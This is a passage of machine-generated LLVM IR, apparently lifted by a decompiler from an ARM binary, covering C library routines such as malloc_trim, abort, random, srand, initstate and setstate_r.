  %v1_16eb8 = add i32 %v3_16eb0, 8
  %v2_16eb8 = inttoptr i32 %v1_16eb8 to i32*
  %v3_16eb8 = load i32, i32* %v2_16eb8, align 4
  store i32 %v3_16eb8, i32* %r3.global-to-local, align 4
  %v9_16ebc = icmp eq i32 %v3_16eb8, %v0_16ea4
  br i1 %v9_16ebc, label %dec_label_pc_16ec8, label %dec_label_pc_16ec4

dec_label_pc_16ec4:                               ; preds = %dec_label_pc_16ea4, %dec_label_pc_16e64, %dec_label_pc_16e48, %dec_label_pc_16eb8
  %v0_16ec4 = call i32 @abort()
  store i32 %v0_16ec4, i32* %r0.global-to-local, align 4
  %v1_16ec8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16eb8, %dec_label_pc_16ec4
  %v1_16ec8 = phi i32 [ %v3_16eb0, %dec_label_pc_16eb8 ], [ %v1_16ec8.pre, %dec_label_pc_16ec4 ]
  %v0_16ec8 = phi i32 [ %v3_16ea4, %dec_label_pc_16eb8 ], [ %v0_16ec4, %dec_label_pc_16ec4 ]
  %v2_16ec8 = add i32 %v1_16ec8, 8
  %v3_16ec8 = inttoptr i32 %v2_16ec8 to i32*
  store i32 %v0_16ec8, i32* %v3_16ec8, align 4
  %v0_16ecc = load i32, i32* %r2.global-to-local, align 4
  %v1_16ecc = load i32, i32* %r0.global-to-local, align 4
  %v2_16ecc = add i32 %v1_16ecc, 12
  %v3_16ecc = inttoptr i32 %v2_16ecc to i32*
  store i32 %v0_16ecc, i32* %v3_16ecc, align 4
  %v0_16ed0 = load i32, i32* @ip, align 4
  %v1_16ed0 = load i32, i32* %r4.global-to-local, align 4
  %v2_16ed0 = add i32 %v1_16ed0, %v0_16ed0
  store i32 %v2_16ed0, i32* @ip, align 4
  br label %dec_label_pc_16ed4

dec_label_pc_16ed4:                               ; preds = %dec_label_pc_16e90.dec_label_pc_16ed4_crit_edge, %dec_label_pc_16ec8
  %v0_16edc = phi i32 [ %v0_16edc.pre, %dec_label_pc_16e90.dec_label_pc_16ed4_crit_edge ], [ %v2_16ed0, %dec_label_pc_16ec8 ]
  store i32 ptrtoint (i32* @global_var_34750.1429 to i32), i32* %r3.global-to-local, align 4
  %v3_16ed8 = load i32, i32* @global_var_34758.1454, align 4
  store i32 %v3_16ed8, i32* %r1.global-to-local, align 4
  %v1_16edc = or i32 %v0_16edc, 1
  store i32 %v1_16edc, i32* @r2, align 4
  %v1_16ee0 = load i32, i32* %lr.global-to-local, align 4
  %v2_16ee0 = add i32 %v1_16ee0, 12
  %v3_16ee0 = inttoptr i32 %v2_16ee0 to i32*
  store i32 ptrtoint (i32* @global_var_34750.1429 to i32), i32* %v3_16ee0, align 4
  %v0_16ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ee4 = load i32, i32* %lr.global-to-local, align 4
  %v2_16ee4 = add i32 %v1_16ee4, 8
  %v3_16ee4 = inttoptr i32 %v2_16ee4 to i32*
  store i32 %v0_16ee4, i32* %v3_16ee4, align 4
  %v0_16ee8 = load i32, i32* @r2, align 4
  %v1_16ee8 = load i32, i32* %lr.global-to-local, align 4
  %v2_16ee8 = add i32 %v1_16ee8, 4
  %v3_16ee8 = inttoptr i32 %v2_16ee8 to i32*
  store i32 %v0_16ee8, i32* %v3_16ee8, align 4
  %v0_16eec = load i32, i32* @ip, align 4
  %v1_16eec = load i32, i32* %lr.global-to-local, align 4
  %v3_16eec = add i32 %v1_16eec, %v0_16eec
  %v4_16eec = inttoptr i32 %v3_16eec to i32*
  store i32 %v0_16eec, i32* %v4_16eec, align 4
  %v0_16ef0 = load i32, i32* %lr.global-to-local, align 4
  %v1_16ef0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16ef0 = add i32 %v1_16ef0, 12
  %v3_16ef0 = inttoptr i32 %v2_16ef0 to i32*
  store i32 %v0_16ef0, i32* %v3_16ef0, align 4
  %v0_16ef4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_16ef4, i32* @global_var_34758.1454, align 4
  br label %dec_label_pc_16f0c

dec_label_pc_16efc:                               ; preds = %dec_label_pc_16e7c
  %v2_16efc = add i32 %v1_16e88, %v0_16efc
  store i32 %v2_16efc, i32* @ip, align 4
  %v1_16f00 = or i32 %v2_16efc, 1
  store i32 %v1_16f00, i32* %r3.global-to-local, align 4
  %v0_16f04 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_16f04, i32* @global_var_34748.1431, align 4
  %v2_16f08 = add i32 %v0_16f04, 4
  %v3_16f08 = inttoptr i32 %v2_16f08 to i32*
  store i32 %v1_16f00, i32* %v3_16f08, align 4
  br label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16ed4, %dec_label_pc_16efc
  %v0_16f0c = load i32, i32* @ip, align 4
  %v3_16f10 = icmp ult i32 %v0_16f0c, 131070
  br i1 %v3_16f10, label %dec_label_pc_16f78, label %dec_label_pc_16f14

dec_label_pc_16f14:                               ; preds = %dec_label_pc_16f0c
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r4, align 4
  %v2_16f18 = load i32, i32* @global_var_3471c.1425, align 4
  store i32 %v2_16f18, i32* %r3.global-to-local, align 4
  %v1_16f1c = and i32 %v2_16f18, 2
  %v2_16f1c = icmp eq i32 %v1_16f1c, 0
  br i1 %v2_16f1c, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_16f14
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %r0.global-to-local, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_16f14, %bb
  store i32 93992, i32* %lr.global-to-local, align 4
  %v1_16f24 = xor i1 %v2_16f1c, true
  call void @__pseudo_cond_branch(i1 %v1_16f24, i32 ptrtoint (i32* @global_var_16c04.1455 to i32))
  %v3_16f28 = load i32, i32* @global_var_34748.1431, align 4
  store i32 %v3_16f28, i32* %r3.global-to-local, align 4
  %v1_16f2c = add i32 %v3_16f28, 4
  %v2_16f2c = inttoptr i32 %v1_16f2c to i32*
  %v3_16f2c = load i32, i32* %v2_16f2c, align 4
  %v3_16f30 = load i32, i32* @global_var_34a60.1444, align 4
  store i32 %v3_16f30, i32* @r2, align 4
  %v1_16f34 = and i32 %v3_16f2c, -4
  store i32 %v1_16f34, i32* %r3.global-to-local, align 4
  %v3_16f38 = icmp ult i32 %v1_16f34, %v3_16f30
  br i1 %v3_16f38, label %dec_label_pc_16f78, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %bb14
  %v0_16f40 = load i32, i32* @r4, align 4
  store i32 %v0_16f40, i32* %r1.global-to-local, align 4
  %v3_16f44 = load i32, i32* @global_var_34a64.1443, align 4
  store i32 %v3_16f44, i32* %r0.global-to-local, align 4
  %v2_16f48 = call i32 @__malloc_trim(i32 %v3_16f44, i32 %v0_16f40)
  store i32 %v2_16f48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16f50:                               ; preds = %dec_label_pc_16e24
  %v2_16f50 = inttoptr i32 %v1_16df4 to i32*
  %v3_16f50 = load i32, i32* %v2_16f50, align 4
  %v3_16f54 = load i32, i32* @global_var_34a6c.1435, align 4
  %v3_16f58 = load i32, i32* @global_var_34a80.1438, align 4
  %v2_16f5c = add i32 %v3_16f50, %v1_16df0
  store i32 %v2_16f5c, i32* %r1.global-to-local, align 4
  %v1_16f60 = add i32 %v3_16f54, -1
  store i32 %v1_16f60, i32* %r2.global-to-local, align 4
  %v2_16f64 = sub i32 %v3_16f58, %v2_16f5c
  store i32 %v2_16f64, i32* %r3.global-to-local, align 4
  %v2_16f68 = sub i32 %v1_16df4, %v3_16f50
  store i32 %v2_16f68, i32* %r0.global-to-local, align 4
  store i32 %v2_16f64, i32* @global_var_34a80.1438, align 4
  store i32 %v1_16f60, i32* @global_var_34a6c.1435, align 4
  %v0_16f74 = call i32 @munmap()
  store i32 %v0_16f74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16f78:                               ; preds = %bb14, %dec_label_pc_16f0c, %dec_label_pc_16f40, %dec_label_pc_16e04, %dec_label_pc_16f50
  store i32 %v2_16db4, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 98448, i32* %r3.global-to-local, align 4
  store i32 94092, i32* @lr, align 4
  %v1_16f88 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v1_16f88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %entry, %dec_label_pc_16f78
  %.0 = phi i32 [ undef, %entry ], [ %v1_16f88, %dec_label_pc_16f78 ]
  store i32 %v3_16dac, i32* @r4, align 4
  store i32 %v6_16dac, i32* @r5, align 4
  store i32 %v9_16dac, i32* @r6, align 4
  store i32 %v12_16dac, i32* @r7, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_16f50, { 1, 0 }
  uselistorder i32 %v0_16eec, { 1, 0 }
  uselistorder i32 %v1_16e38, { 1, 0 }
  uselistorder i32 %v0_16e38, { 1, 0 }
  uselistorder i32 %v3_16e08, { 1, 0 }
  uselistorder i32 %v1_16df0, { 1, 0, 2 }
  uselistorder i32 %v2_16dec, { 1, 2, 0, 3 }
  uselistorder i32 %v3_16de8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16db0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 5, 13, 14, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_34750.1429 to i32), { 7, 8, 3, 9, 1, 4, 10, 0, 5, 6, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_34718.1427 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16f8c, { 1, 0 }
  uselistorder label %dec_label_pc_16f78, { 4, 2, 0, 1, 3 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_16f0c, { 1, 0 }
  uselistorder label %dec_label_pc_16ed4, { 1, 0 }
  uselistorder label %dec_label_pc_16ec8, { 1, 0 }
  uselistorder label %dec_label_pc_16ec4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16e7c, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_16fb4 = load i32, i32* @r4, align 4
  store i32 %v3_16fb4, i32* %stack_var_-12, align 4
  %v6_16fb4 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r0, align 4
  %v0_16fc4 = call i32 @__malloc_consolidate()
  %v0_16fc8 = load i32, i32* @r4, align 4
  %v0_16fcc = load i32, i32* @r5, align 4
  %v2_16fd0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16fd0, i32* @r4, align 4
  store i32 %v6_16fb4, i32* @r5, align 4
  %v2_16fd4 = call i32 @__malloc_trim(i32 %v0_16fc8, i32 %v0_16fcc)
  %v0_16fd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16fd8, label %bb, label %bb4

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  ret i32 %v2_16fd4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_16fdc = ptrtoint i32* %stack_var_-28 to i32
  store i32 94192, i32* @lr, align 4
  %v2_16fec = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e348.1460 to i32))
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 32, i32* %stack_var_-8, align 4
  %v6_1700c = bitcast i32* %stack_var_-8 to %_TYPEDEF_sigset_t*
  %v7_1700c = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v6_1700c, i32 0, i32 32)
  %v2_17014 = load i32, i32* @global_var_3466c.1462, align 4
  %v2_17018 = icmp eq i32 %v2_17014, 0
  br i1 %v2_17018, label %dec_label_pc_17020, label %dec_label_pc_17050

dec_label_pc_17020:                               ; preds = %entry
  store i32 1, i32* @global_var_3466c.1462, align 4
  br label %dec_label_pc_17028

dec_label_pc_17028:                               ; preds = %dec_label_pc_17060, %dec_label_pc_17020
  store i32 94264, i32* @lr, align 4
  %v2_17034 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e348.1460 to i32))
  %v1_1703c = call i32 @__GI_raise(i32 6)
  store i32 94288, i32* @lr, align 4
  %v2_1704c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e348.1460 to i32))
  %v2_17054.pre = load i32, i32* @global_var_3466c.1462, align 4
  br label %dec_label_pc_17050

dec_label_pc_17050:                               ; preds = %entry, %dec_label_pc_17028
  %v0_170a0 = phi i32 [ %v2_17014, %entry ], [ %v2_17054.pre, %dec_label_pc_17028 ]
  store i32 ptrtoint (i32* @global_var_3466c.1462 to i32), i32* %ip.global-to-local, align 4
  %v7_17058 = icmp eq i32 %v0_170a0, 1
  br i1 %v7_17058, label %dec_label_pc_17060, label %dec_label_pc_17098

dec_label_pc_17060:                               ; preds = %dec_label_pc_17050
  store i32 2, i32* @global_var_3466c.1462, align 4
  store i32 20, i32* @r2, align 4
  %v2_17074 = bitcast i32* %stack_var_-28 to i8*
  %v3_17074 = call i32 @__GI_memset(i8* %v2_17074, i32 0)
  %v3_17090 = call i32 @__libc_sigaction(i32 6, i32 %v2_16fdc, i32 0)
  br label %dec_label_pc_17028

dec_label_pc_17098:                               ; preds = %dec_label_pc_17050
  %v7_17098 = icmp eq i32 %v0_170a0, 2
  br i1 %v7_17098, label %dec_label_pc_170a0, label %dec_label_pc_170ac

dec_label_pc_170a0:                               ; preds = %dec_label_pc_17098
  store i32 3, i32* @global_var_3466c.1462, align 4
  %v0_170a8 = call i32 @abort()
  %v2_170ac.pre = load i32, i32* @global_var_3466c.1462, align 4
  br label %dec_label_pc_170ac

dec_label_pc_170ac:                               ; preds = %dec_label_pc_17098, %dec_label_pc_170a0
  %v1_170b4 = phi i32 [ %v0_170a0, %dec_label_pc_17098 ], [ %v2_170ac.pre, %dec_label_pc_170a0 ]
  %v7_170b0 = icmp eq i32 %v1_170b4, 3
  br i1 %v7_170b0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_170ac
  %v2_170bc = load i32, i32* %ip.global-to-local, align 4
  %v3_170bc = inttoptr i32 %v2_170bc to i32*
  store i32 4, i32* %v3_170bc, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_170ac, %bb
  call void @__pseudo_cond_branch(i1 %v7_170b0, i32 ptrtoint (i32* @global_var_14288.1464 to i32))
  br label %dec_label_pc_170c4

dec_label_pc_170c4:                               ; preds = %dec_label_pc_170c4, %.thread1
  %v0_170c4 = call i32 @abort()
  br label %dec_label_pc_170c4

; uselistorder directives
  uselistorder i32* @global_var_3466c.1462, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32, i32)* @__GI_sigprocmask, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_170ac, { 1, 0 }
  uselistorder label %dec_label_pc_17050, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_170dc = call i32 @random()
  ret i32 %v0_170dc

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 10, 12, 11, 3, 2, 7, 6, 5, 4, 9, 8, 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_170e0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2e360.1466 to i32), i32* @r4, align 4
  %v2_170e8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2e360.1466 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_170e8, i32* @r0, align 4
  %v1_17100 = call i32 @_pthread_cleanup_push_defer()
  %v0_17108 = load i32, i32* @r4, align 4
  %v2_17110 = call i32 @__pthread_return_0(i32 %v0_17108)
  %v2_17114 = ptrtoint i32* %stack_var_-16 to i32
  %v3_1711c = call i32 @__GI_random_r(i32* inttoptr (i32 189304 to i32*), i32 %v2_17114)
  store i32 %v2_170e8, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 94516, i32* @lr, align 4
  %v1_17130 = call i32 @_pthread_cleanup_pop_restore()
  %v3_17134 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_170e0, i32* @r4, align 4
  ret i32 %v3_17134
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_17160 = ptrtoint i32* %stack_var_-24 to i32
  store i32 ptrtoint (i32* @global_var_2e360.1466 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_17160, i32* @r0, align 4
  %v1_1717c = call i32 @_pthread_cleanup_push_defer()
  %v2_1718c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e360.1466 to i32))
  %v3_1719c = load i32, i32* bitcast (i32** @global_var_2e380.1479 to i32*), align 4
  store i32 %v3_1719c, i32* @r4, align 4
  %v3_171a0 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_2e378)
  store i32 1, i32* @r1, align 4
  %v1_171a8 = icmp slt i32 %v3_171a0, 0
  store i32 %v2_17160, i32* @r0, align 4
  %v3_171b8 = load i32, i32* @r4, align 4
  %v4_171b8 = add i32 %v3_171b8, -4
  %storemerge = select i1 %v1_171a8, i32 0, i32 %v4_171b8
  %v1_171c0 = call i32 @_pthread_cleanup_pop_restore()
  ret i32 %storemerge
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_171e8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2e360.1466 to i32), i32* %r4.global-to-local, align 4
  %v2_171f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e360.1466 to i32), i32* @r2, align 4
  store i32 %v2_171f0, i32* @r0, align 4
  %v1_17214 = call i32 @_pthread_cleanup_push_defer()
  %v0_17218 = load i32, i32* %r4.global-to-local, align 4
  %v2_17224 = call i32 @__pthread_return_0(i32 %v0_17218)
  %v0_1722c = load i32, i32* @r5, align 4
  %v0_17230 = load i32, i32* @r6, align 4
  %v0_17234 = load i32, i32* @r8, align 4
  %v3_17238 = load i32, i32* bitcast (i32** @global_var_2e380.1479 to i32*), align 4
  store i32 %v3_17238, i32* @r4, align 4
  %v4_1723c = inttoptr i32 %v0_1722c to i32*
  %v5_1723c = call i32 @__GI_initstate_r(i32 %v0_17234, i32* %v4_1723c, i32 %v0_17230, i32 ptrtoint (i32* @global_var_2e378 to i32))
  store i32 %v2_171f0, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_17250 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v3_171e8, i32* %r4.global-to-local, align 4
  ret i32 ptrtoint (i32** @global_var_2e37c.1487 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_17280 = load i32, i32* @r4, align 4
  %v9_17280 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2e360.1466 to i32), i32* @r4, align 4
  %v2_17288 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2e360.1466 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_17288, i32* @r0, align 4
  %v1_172a4 = call i32 @_pthread_cleanup_push_defer()
  %v0_172ac = load i32, i32* @r4, align 4
  %v2_172b4 = call i32 @__pthread_return_0(i32 %v0_172ac)
  %v0_172b8 = load i32, i32* @r6, align 4
  store i32 %v0_172b8, i32* @r0, align 4
  %v2_172c0 = inttoptr i32 %v0_172b8 to i32*
  %v3_172c0 = call i32 @srandom_r(i32* %v2_172c0, i32 ptrtoint (i32* @global_var_2e378 to i32))
  store i32 %v2_17288, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_172d8 = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v3_17280, i32* @r4, align 4
  store i32 %v9_17280, i32* @r6, align 4
  ret i32 %v1_172d8

; uselistorder directives
  uselistorder i32* @global_var_2e378, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2e378 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2e360.1466 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_172fc = load i32, i32* @r4, align 4
  store i32 %v3_172fc, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_17304 = add i32 %tmp, 12
  %v2_17304 = inttoptr i32 %v1_17304 to i8*
  %v3_17304 = load i8, i8* %v2_17304, align 1
  %v2_17308 = icmp eq i8 %v3_17304, 0
  store i1 %v2_17308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17308, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v4_17304 = zext i8 %v3_17304 to i32
  %v1_1731011 = add i32 %arg1, 4
  store i32 %v1_1731011, i32* %r6.global-to-local, align 4
  %v1_1731412 = add i32 %tmp, 8
  %v2_1731413 = inttoptr i32 %v1_1731412 to i32*
  %v3_1731414 = load i32, i32* %v2_1731413, align 4
  store i32 %v3_1731414, i32* %r0.global-to-local, align 4
  %v3_17330 = add i32 %v3_1731414, -4
  %v4_17330 = inttoptr i32 %v3_17330 to i32*
  store i32 %v4_17304, i32* %v4_17330, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_1730c = add i32 %tmp, 4
  %v3_1730c = inttoptr i32 %v2_1730c to i32*
  %v4_1730c = load i32, i32* %v3_1730c, align 4
  %v1_17310 = add i32 %arg1, 4
  store i32 %v1_17310, i32* %r6.global-to-local, align 4
  %v1_17314 = add i32 %tmp, 8
  %v2_17314 = inttoptr i32 %v1_17314 to i32*
  %v3_17314 = load i32, i32* %v2_17314, align 4
  store i32 %v3_17314, i32* %r0.global-to-local, align 4
  %v3_1731c = sub i32 %v4_1730c, %v3_17314
  %v4_17320 = sdiv i32 %v3_1731c, 4
  %v4_17324 = sext i8 %v3_17304 to i32
  %v4_1732c = mul i32 %v4_17320, 5
  %v5_1732c = add i32 %v4_1732c, %v4_17324
  %v3_17334 = add i32 %v3_17314, -4
  %v4_17334 = inttoptr i32 %v3_17334 to i32*
  store i32 %v5_1732c, i32* %v4_17334, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_1733c = load i32, i32* %r6.global-to-local, align 4
  %v1_1733c = add i32 %v0_1733c, -4
  %v2_1733c = inttoptr i32 %v1_1733c to i32*
  %v3_1733c = load i32, i32* %v2_1733c, align 4
  %v2_17340 = srem i32 %v3_1733c, 5
  store i32 %v2_17340, i32* %r0.global-to-local, align 4
  %v2_17344 = icmp ugt i32 %v2_17340, 3
  %v7_17344 = icmp eq i32 %v2_17340, 4
  store i1 %v7_17344, i1* %cpsr_z.global-to-local, align 1
  %v2_17348 = xor i1 %v7_17344, true
  %v3_17348 = and i1 %v2_17344, %v2_17348
  br i1 %v3_17348, label %dec_label_pc_173ac, label %dec_label_pc_1734c

dec_label_pc_1734c:                               ; preds = %bb
  %v4_17350 = mul nsw i32 %v2_17340, 4
  %v5_17350 = add i32 %v4_17350, ptrtoint (i32* @global_var_25330.1495 to i32)
  %v1_17354 = add i32 %v4_17350, add (i32 ptrtoint (i32* @global_var_25330.1495 to i32), i32 20)
  %v2_17354 = inttoptr i32 %v1_17354 to i32*
  %v3_17354 = load i32, i32* %v2_17354, align 4
  store i32 %v3_17354, i32* %r5.global-to-local, align 4
  %v6_17358 = inttoptr i32 %v5_17350 to i32*
  %v7_17358 = load i32, i32* %v6_17358, align 4
  store i32 %v7_17358, i32* %r7.global-to-local, align 4
  %v2_1735c = icmp eq i32 %v2_17340, 0
  store i1 %v2_1735c, i1* %cpsr_z.global-to-local, align 1
  %v1_17360 = trunc i32 %v3_17354 to i8
  %v2_17360 = load i32, i32* %r4.global-to-local, align 4
  %v3_17360 = add i32 %v2_17360, 13
  %v4_17360 = inttoptr i32 %v3_17360 to i8*
  store i8 %v1_17360, i8* %v4_17360, align 1
  %v0_17364 = load i32, i32* %r7.global-to-local, align 4
  %v1_17364 = trunc i32 %v0_17364 to i8
  %v2_17364 = load i32, i32* %r4.global-to-local, align 4
  %v3_17364 = add i32 %v2_17364, 14
  %v4_17364 = inttoptr i32 %v3_17364 to i8*
  store i8 %v1_17364, i8* %v4_17364, align 1
  %v0_17368 = load i32, i32* %r0.global-to-local, align 4
  %v1_17368 = trunc i32 %v0_17368 to i8
  %v2_17368 = load i32, i32* %r4.global-to-local, align 4
  %v3_17368 = add i32 %v2_17368, 12
  %v4_17368 = inttoptr i32 %v3_17368 to i8*
  store i8 %v1_17368, i8* %v4_17368, align 1
  %v0_1736c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1736c, label %dec_label_pc_17398, label %dec_label_pc_17370

dec_label_pc_17370:                               ; preds = %dec_label_pc_1734c
  %v0_17374 = load i32, i32* %r6.global-to-local, align 4
  %v1_17374 = add i32 %v0_17374, -4
  %v2_17374 = inttoptr i32 %v1_17374 to i32*
  %v3_17374 = load i32, i32* %v2_17374, align 4
  %v2_17378 = sdiv i32 %v3_17374, 5
  store i32 %v2_17378, i32* %r0.global-to-local, align 4
  %v4_1737c = mul i32 %v2_17378, 4
  %v5_1737c = add i32 %v4_1737c, %v0_17374
  %v1_17380 = load i32, i32* %r4.global-to-local, align 4
  %v2_17380 = add i32 %v1_17380, 4
  %v3_17380 = inttoptr i32 %v2_17380 to i32*
  store i32 %v5_1737c, i32* %v3_17380, align 4
  %v0_17384 = load i32, i32* %r7.global-to-local, align 4
  %v1_17384 = load i32, i32* %r0.global-to-local, align 4
  %v2_17384 = add i32 %v1_17384, %v0_17384
  %v0_17388 = load i32, i32* %r5.global-to-local, align 4
  %v2_1738c = srem i32 %v2_17384, %v0_17388
  %v0_17390 = load i32, i32* %r6.global-to-local, align 4
  %v4_17390 = mul i32 %v2_1738c, 4
  %v5_17390 = add i32 %v0_17390, %v4_17390
  store i32 %v5_17390, i32* %r0.global-to-local, align 4
  %v1_17394 = load i32, i32* %r4.global-to-local, align 4
  %v2_17394 = inttoptr i32 %v1_17394 to i32*
  store i32 %v5_17390, i32* %v2_17394, align 4
  br label %dec_label_pc_17398

dec_label_pc_17398:                               ; preds = %dec_label_pc_1734c, %dec_label_pc_17370
  %v0_17398 = load i32, i32* %r6.global-to-local, align 4
  %v1_17398 = load i32, i32* %r5.global-to-local, align 4
  %v4_17398 = mul i32 %v1_17398, 4
  %v5_17398 = add i32 %v4_17398, %v0_17398
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_173a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_173a0 = add i32 %v1_173a0, 16
  %v3_173a0 = inttoptr i32 %v2_173a0 to i32*
  store i32 %v5_17398, i32* %v3_173a0, align 4
  %v0_173a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_173a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_173a4 = add i32 %v1_173a4, 8
  %v3_173a4 = inttoptr i32 %v2_173a4 to i32*
  store i32 %v0_173a4, i32* %v3_173a4, align 4
  %v2_173a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_173a8, i32* @r4, align 4
  ret i32 0

dec_label_pc_173ac:                               ; preds = %bb
  %v0_173ac = call i32 @__GI___errno_location()
  %v2_173b4 = inttoptr i32 %v0_173ac to i32*
  store i32 22, i32* %v2_173b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_173bc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_173bc, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i8 %v3_17304, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3 }
